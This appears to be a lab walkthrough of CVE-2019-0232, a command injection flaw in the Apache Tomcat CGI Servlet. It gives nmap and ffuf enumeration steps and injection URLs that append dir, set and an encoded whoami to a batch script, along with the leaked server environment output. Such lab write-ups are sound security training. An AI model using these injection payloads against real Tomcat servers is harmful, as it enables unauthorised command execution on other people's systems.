`CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

CGI scripts are utilized in websites for several reasons, but there are also some pretty big disadvantages to using them:

| **Advantages**                                                                               | **Disadvantages**                                                          |
| -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| It is simple and effective for generating dynamic web content.                               | Incurs overhead by having to load programs into memory for each request.   |
| Use any programming language that can read from standard input and write to standard output. | Cannot easily cache data in memory between page requests.                  |
| Can reuse existing code and avoid writing new code.                                          | It reduces the server's performance and consumes a lot of processing time. |
### What is it
`enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string
Calling the script. `http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby`

# Enumeration
`nmap -p- -sC -Pn 10.129.204.227 --open`

### Dir Busting the Webpage
For .CMD
`ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd`

For .BAT
`ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat`

# Exploitation
As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`
`http://10.129.204.227:8080/cgi/welcome.bat?&dir`

Retrieving a set list of commands that can be used
`http://10.129.204.227:8080/cgi/welcome.bat?&set`
```http
Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

You can do the basic command of this but then using filtering can accomplish the goal.
`http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`

Filtered
`http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
